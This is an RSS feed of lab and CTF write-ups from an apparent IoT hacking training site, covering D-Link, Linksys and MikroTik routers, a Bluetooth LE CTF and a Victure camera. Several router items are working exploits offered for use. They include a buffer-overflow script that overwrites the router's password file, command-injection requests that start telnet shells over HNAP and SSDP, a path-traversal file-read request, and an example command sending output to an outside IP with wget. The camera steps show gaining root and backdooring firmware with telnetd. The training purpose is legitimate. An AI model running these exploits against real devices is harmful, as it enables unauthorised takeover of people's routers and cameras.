<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>IoT Hack Labs</title><link>https://iot-hack-labs.github.io/</link><description>Recent content on IoT Hack Labs</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 18 Oct 2021 20:52:11 -0600</lastBuildDate><atom:link href="https://iot-hack-labs.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>Auth Buffer Overflow</title><link>https://iot-hack-labs.github.io/router-lab/dir-815/auth-buffer-overflow/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/router-lab/dir-815/auth-buffer-overflow/</guid><description>Auth Buffer Overflow import urllib import urllib2 # This exploits the auth_main.cgi with read buffer overflow exploit for v2.02 # prequisite is just to have id and password fields in params url = &amp;#39;http://192.168.0.1/authentication.cgi&amp;#39; junk = &amp;#34;A&amp;#34;*1004+&amp;#34;B&amp;#34;*37+&amp;#34;\x58\xf8\x40\x00&amp;#34; # address of system function in executable junk+=&amp;#34;X&amp;#34;*164+&amp;#39;echo &amp;#34;Admin&amp;#34; &amp;#34;Admin&amp;#34; &amp;#34;0&amp;#34; &amp;gt; /var/passwd\x00&amp;#39;+&amp;#34;AAAA&amp;#34; values = &amp;#34;id=test&amp;amp;password=test&amp;amp;test=&amp;#34;+junk req = urllib2.Request(url, values) response = urllib2.urlopen(req) the_page = response.read()</description></item><item><title>Discovery</title><link>https://iot-hack-labs.github.io/router-lab/mikrotik/01-discovery/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/router-lab/mikrotik/01-discovery/</guid><description>Discovery This requires the attacker discover that port 8291 is exposed and running the Winbox service. (Not in the default nmap scan port list)
Only ports 8291, 21 are open.
nmap 172.21.0.4 -p21,22,23,53,80,2000,8291 Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-18 13:20 MDT Nmap scan report for 172.21.0.4 Host is up (0.0047s latency). PORT STATE SERVICE 21/tcp open ftp 22/tcp filtered ssh 23/tcp filtered telnet 53/tcp filtered domain 80/tcp filtered http 2000/tcp filtered cisco-sccp 8291/tcp open unknown The router version can be found by running nmap with service discovery.</description></item><item><title>Getting Started</title><link>https://iot-hack-labs.github.io/btle-ctf/01-getting-started/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/btle-ctf/01-getting-started/</guid><description>Devices Because it may be difficult to scan for all Bluetooth devices in such a crowded area, the BLE_CTF_INFINITY MAC addresses are provided below. If you are at a provided lab machine, try use the same number as your lab number. 1-5.
08:3A:F2:7D:65:8A 94:B9:7E:FA:27:72 94:B9:7E:F9:21:B6 94:B9:7E:FA:71:F2 94:B9:7E:FA:2A:42 4C:EB:D6:75:4E:B6 94:B9:7E:DA:08:56 Tools We can use a few different tools to solve some BLE CTF Infinity challenges.
hciconfig bleah gatttool Hciconfig You can view BLE interfaces on you system by using the hciconfig command.</description></item><item><title>Local File Inclusion</title><link>https://iot-hack-labs.github.io/router-lab/wrt160n/local-file-inclusion/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/router-lab/wrt160n/local-file-inclusion/</guid><description>Local File Inclusion Make an HTTP POST request to the router like the following:
POST /apply.cgi HTTP/1.1 Host: {TARGET_IP} User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Proxy-Connection: keep-alive Authorization: Basic {BASE_64_CREDENTIALS} Content-Type: application/x-www-form-urlencoded Content-Length: 181 Connection: close submit_type=wsc_method2&amp;amp;change_action=gozila_cgi&amp;amp;next_page=../..{FILE} NOTE: Replace {TARGET_IP}, {BASE_64_CREDENTIALS}, {FILE_TO_READ} with the valid IP, credentials, and file to read respectively</description></item><item><title>OS Command Injection</title><link>https://iot-hack-labs.github.io/router-lab/dir-655/os-command-injection/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/router-lab/dir-655/os-command-injection/</guid><description>OS Command Injection Make an HTTP POST request to the router, replacing &amp;ldquo;{URL_ENCODED_CMD}&amp;rdquo; with the desired command to run on the router like wget%20-P%20/tmp/%20http://45.76.148.31:4321/?$(echo 1234)
POST /apply_sec.cgi HTTP/1.1 Host: 192.168.232.128 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 131 Connection: close Referer: http://192.168.232.128/login_pic.asp Cookie: uid=1234123 Upgrade-Insecure-Requests: 1 html_response_page=login_pic.asp&amp;amp;action=ping_test&amp;amp;ping_ipaddr=127.0.0.1%0a{URL_ENCODED_CMD}</description></item><item><title>OS Command Injection</title><link>https://iot-hack-labs.github.io/router-lab/wrt160n/os-command-injection/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/router-lab/wrt160n/os-command-injection/</guid><description>OS Command Injection Make an HTTP POST request to the router like the following:
POST /apply.cgi HTTP/1.1 Host: {TARGET_IP} User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Proxy-Connection: keep-alive Authorization: Basic {BASE_64_CREDENTIALS} Content-Type: application/x-www-form-urlencoded Content-Length: 181 Connection: close submit_button=Diagnostics&amp;amp;change_action=gozila_cgi&amp;amp;submit_type=start_ping&amp;amp;action=&amp;amp;commit=0&amp;amp;ping_ip=1.1.1.1&amp;amp;ping_size=|{URL_ENCODED_CMD}|&amp;amp;ping_times=5&amp;amp;traceroute_ip= NOTE: Replace {TARGET_IP}, {BASE_64_CREDENTIALS}, {URL_ENCODED_CMD} with the valid IP, credentials, and url encoded command respectively</description></item><item><title>OS Command Injection I</title><link>https://iot-hack-labs.github.io/router-lab/dir-815/os-command-injection-i/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/router-lab/dir-815/os-command-injection-i/</guid><description>OS Command Injection I import socket import struct # CSRF or any other trickery, but probably only works when connected to network I suppose buf = &amp;#34;POST /HNAP1/ HTTP/1.0\r\nHOST: 99.249.143.124\r\nUser-Agent: test\r\nContent-Length: 1\r\nSOAPAction:http://purenetworks.com/HNAP1/GetDeviceSettings/XX&amp;#34; + &amp;#39;;telnetd -p 9090;\r\n&amp;#39; + &amp;#34;1\r\n\r\n&amp;#34; print &amp;#34;[+] sending buffer size&amp;#34;, len(buf) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((&amp;#34;192.168.0.1&amp;#34;, 80)) s.send(buf) or
import socket import struct # format junk+ROP1(have right value in A0) + ROP2(add or subtract to create right system address) + ROP3(Jump to right address) buf = &amp;#34;POST /HNAP1/ HTTP/1.</description></item><item><title>OS Command Injection II</title><link>https://iot-hack-labs.github.io/router-lab/dir-815/os-command-injection-ii/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/router-lab/dir-815/os-command-injection-ii/</guid><description>OS Command Injection II import socket import struct # This vulnerability is pretty much in every router that has cgibin and uses SSDP code in that cgibin. This one worked on the device dir-815. Will work only in WLAN buf = &amp;#39;M-SEARCH * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nST:urn:schemas-upnp-org:service:WANIPConnection:1;telnetd -p 9094;ls\r\nMX:2\r\nMAN:&amp;#34;ssdp:discover&amp;#34;\r\n\r\n&amp;#39; print &amp;#34;[+] sending buffer size&amp;#34;, len(buf) s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) s.connect((&amp;#34;239.255.255.250&amp;#34;, 1900)) s.send(buf) s.close()</description></item><item><title>References</title><link>https://iot-hack-labs.github.io/router-lab/dir-655/references/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/router-lab/dir-655/references/</guid><description>References https://www.zdnet.com/article/d-link-routers-contain-remote-code-execution-vulnerability/ https://www.fortinet.com</description></item><item><title>References</title><link>https://iot-hack-labs.github.io/router-lab/dir-815/references/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/router-lab/dir-815/references/</guid><description>References https://www.exploit-db.com/exploits/38721 https://www.exploit-db.com/exploits/38715</description></item><item><title>References</title><link>https://iot-hack-labs.github.io/router-lab/x150n/references/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/router-lab/x150n/references/</guid><description>References https://www.akamai.com/content/dam/site/en/documents/research-paper/upnproxy-blackhat-proxies-via-nat-injections-white-paper.pdf</description></item><item><title>Exploitation</title><link>https://iot-hack-labs.github.io/router-lab/mikrotik/02-exploitation/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/router-lab/mikrotik/02-exploitation/</guid><description>Exploitation The following versions of Router OS are vulnerable to &amp;ldquo;ByTheWay&amp;rdquo; exploit:
Longterm: 6.30.1 - 6.40.7 Stable: 6.29 - 6.42 Beta: 6.29rc1 - 6.43rc3 The exploit can be found here, from Tenable team: https://github.com/tenable/routeros/tree/master/poc/bythewayThe attacker needs to clone the repo, and build the target. This requires downloading boost libs in Kali and some basic compilation. After that, the exploit should work out of the box, at least it will report the dumped creds.</description></item><item><title>Flag0</title><link>https://iot-hack-labs.github.io/btle-ctf/02-flag0/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/btle-ctf/02-flag0/</guid><description>Here are the target devices for reference:
08:3A:F2:7D:65:8A 94:B9:7E:FA:27:72 94:B9:7E:F9:21:B6 94:B9:7E:FA:71:F2 94:B9:7E:FA:2A:42 4C:EB:D6:75:4E:B6 94:B9:7E:DA:08:56 Use bleah to enumerate the characteristics on the device. (Remember to change the device MAC address)
$ sudo bleah -b 94:B9:7E:FA:27:72 -e ⚠️ Try this a few times if it doesn&amp;rsquo;t work and/or removing and plugging in the bluetooth dongle.
For the flag 0, we notice that the &amp;lsquo;Device Name&amp;rsquo; kinda looks like a flag.</description></item><item><title>Exploitation</title><link>https://iot-hack-labs.github.io/router-lab/mikrotik/03-notes/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/router-lab/mikrotik/03-notes/</guid><description>Additional Notes For this challenge, I actually manually extracted and placed the user.dat file so the challenge would be at an easier level. That being said, the attacker could test downloading different files and if they found an unencrypted backup, which was generated natively via configuring the router, they would have the same end result. Maybe a good challenge for next year.</description></item><item><title>Flag1</title><link>https://iot-hack-labs.github.io/btle-ctf/03-flag1/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/btle-ctf/03-flag1/</guid><description>Here are the target devices for reference:
08:3A:F2:7D:65:8A 94:B9:7E:FA:27:72 94:B9:7E:F9:21:B6 94:B9:7E:FA:71:F2 94:B9:7E:FA:2A:42 4C:EB:D6:75:4E:B6 94:B9:7E:DA:08:56 Navigate to Flag 1 Challenge Navigate to challenge 1 by writing 0x0001 to handle 0x0030
gatttool -b 94:B9:7E:FA:27:72 --char-write-req -a 0x0030 -n 0001 ⚠️ Retry the command and/or replugging in the dongle until we get the following message:
Characteristic Write Request failed: Request attribute has encountered an unlikely error Use Bleah to Enumerate All Characteristics At this point, if we try to use bleah to enumerate the characteristics, we see that bleah shows us some interesting values.</description></item><item><title>Flag2</title><link>https://iot-hack-labs.github.io/btle-ctf/04-flag2/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/btle-ctf/04-flag2/</guid><description>Here are the target devices for reference:
08:3A:F2:7D:65:8A 94:B9:7E:FA:27:72 94:B9:7E:F9:21:B6 94:B9:7E:FA:71:F2 94:B9:7E:FA:2A:42 4C:EB:D6:75:4E:B6 94:B9:7E:DA:08:56 Navigate to Flag 2 Challenge Navigate to challenge 2 by writing 0x0002 to handle 0x0030
gatttool -b 94:B9:7E:FA:27:72 --char-write-req -a 0x0030 -n 0002 ⚠️ Retry the command and/or replugging in the dongle until we get the following message:
Characteristic Write Request failed: Request attribute has encountered an unlikely error View Gatt Table After switching to challenge 2, use bleah to enumerate its characteristics again.</description></item><item><title>Flag2</title><link>https://iot-hack-labs.github.io/btle-ctf/05-flag3/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/btle-ctf/05-flag3/</guid><description>Here are the target devices for reference:
08:3A:F2:7D:65:8A 94:B9:7E:FA:27:72 94:B9:7E:F9:21:B6 94:B9:7E:FA:71:F2 94:B9:7E:FA:2A:42 4C:EB:D6:75:4E:B6 94:B9:7E:DA:08:56 Navigate to Flag 3 Challenge Navigate to challenge 3 by writing 0x0003 to handle 0x0030
gatttool -b 94:B9:7E:FA:27:72 --char-write-req -a 0x0030 -n 0003 ⚠️ Retry the command and/or replugging in the dongle until we get the following message:
Characteristic Write Request failed: Request attribute has encountered an unlikely error View Gatt Table Use bleah to enumerate its characteristics again.</description></item><item><title>Finishing up</title><link>https://iot-hack-labs.github.io/btle-ctf/99-outro/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/btle-ctf/99-outro/</guid><description>Thats it for this lab. You are welcome to continue to try the other challenges. If you are done, reset the CTF by writing 0xC1EA12 to handle 0x0032.
$ gatttool -b AA:BB:CC:DD:EE:FF --char-write-req -a 0x0032 -n C1EA12 References https://github.com/hackgnar/ble_ctf_infinity Chapter 11 of Practical IoT Hackingfrom No Starch Press.</description></item><item><title>Micro SD</title><link>https://iot-hack-labs.github.io/victure-pc420/01-micro-sd/</link><pubDate>Mon, 18 Oct 2021 20:46:32 -0600</pubDate><guid>https://iot-hack-labs.github.io/victure-pc420/01-micro-sd/</guid><description>Micro SD The micro SD must be FAT32 formatted. The following steps can be skipped if your micro SD is already FAT32 formatted.
Partitioning When the micro SD card is plugged in, run the following to determine the micro SD&amp;rsquo;s block device on the computer
kali@kali:~$ sudo fdisk -l Disk /dev/sda: 80 GiB, 85899345920 bytes, 167772160 sectors Disk model: VMware Virtual S Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disklabel type: dos Disk identifier: 0x0852c5cd Device Boot Start End Sectors Size Id Type /dev/sda1 * 2048 165771263 165769216 79G 83 Linux /dev/sda2 165773310 167770111 1996802 975M 5 Extended /dev/sda5 165773312 167770111 1996800 975M 82 Linux swap / Solaris Disk /dev/sdb: 3.</description></item><item><title>UART to U-Boot</title><link>https://iot-hack-labs.github.io/victure-pc420/02-uart-to-uboot/</link><pubDate>Mon, 18 Oct 2021 20:47:46 -0600</pubDate><guid>https://iot-hack-labs.github.io/victure-pc420/02-uart-to-uboot/</guid><description>UART to U-Boot We will now connect to the Victure camera via the USB to TTL adapter.
Connect the female ends of the jumper cables to the TX, RX, and GND pins on the USB to TTL adapter shown above. Once done, connect the adapter to the computer
screen can be used to connect to serial consoles. To connect to the adapter, run the following
kali@kali:~$ screen /dev/ttyUSB0 115200 Where,</description></item><item><title>U-Boot to Root</title><link>https://iot-hack-labs.github.io/victure-pc420/03-uboot-to-root/</link><pubDate>Mon, 18 Oct 2021 20:48:21 -0600</pubDate><guid>https://iot-hack-labs.github.io/victure-pc420/03-uboot-to-root/</guid><description>U-Boot to Root The current shell is actually a U-Boot a limited shell. U-Boot is an open-source, primary boot loader. This shell has commands related to the booting process.
anyka$ help ? - alias for 'help' base - print or set address offset bootm - boot application image from memory bootp - boot image via network using BOOTP/TFTP protocol chpart - change active partition cmp - memory compare cp - memory copy crc32 - checksum calculation downcheck_patition_update- load usr.</description></item><item><title>Configure Remote Connection</title><link>https://iot-hack-labs.github.io/victure-pc420/04-configure-remote-connection/</link><pubDate>Mon, 18 Oct 2021 20:48:21 -0601</pubDate><guid>https://iot-hack-labs.github.io/victure-pc420/04-configure-remote-connection/</guid><description>Configure Remote Connection We have successfully been dropped into a root shell on the camera, but this required physical access. We are next going to update the camera&amp;rsquo;s firmware to run telnetd upon booting up, allowing us to connect to it remotely.
Dump Firmware The first step in enabling remote connections is to dump the camera&amp;rsquo;s firmware.
You may notice that, though we have shell, basic commands like whoami seem to give errors</description></item><item><title>Test Remote Connection</title><link>https://iot-hack-labs.github.io/victure-pc420/05-test-remote-connection/</link><pubDate>Mon, 18 Oct 2021 20:52:11 -0600</pubDate><guid>https://iot-hack-labs.github.io/victure-pc420/05-test-remote-connection/</guid><description>Test Remote Connection Now that the camera is connected to the WiFi, we should be able to disconnect our USB to TTL adapter and remotely connect to it.
kali@kali:~$ telnet 192.168.4.46 Trying 192.168.4.46... Connected to 192.168.4.46. Escape character is '^]'. anyka login: root Password: welcome to file system [root@anyka ~]$ uname -a Linux anyka 3.4.35 #9 Thu Feb 25 11:45:35 UTC 2021 armv5tejl GNU/Linux</description></item></channel></rss>